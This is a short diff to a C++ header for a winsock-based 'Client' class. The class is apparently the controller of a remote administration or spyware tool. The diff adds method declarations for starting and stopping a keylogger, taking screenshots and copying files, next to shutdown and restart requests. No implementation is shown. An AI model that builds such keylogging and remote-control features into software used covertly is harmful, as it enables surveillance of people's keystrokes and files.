@@ -3,7 +3,10 @@
 
 #include <winsock2.h>
 #include <fstream>
+#include <vector>
 #include <string>
+#include <cstdint>
+#include <algorithm>
 
 class Client {
 public:
@@ -13,8 +16,10 @@ public:
     bool sendShutdownRequest();
 
     bool sendRestartRequest();
-    bool sendKeyloggerRequest();
+    bool sendKeyloggerStartRequest();
+    bool sendKeyloggerOffRequest();
     bool sendScreenshotRequest();
+    bool sendFileCopyRequest(const std::string& sourceFileName, const std::string& destinationFileName);
 
 private:
     std::string serverIP;
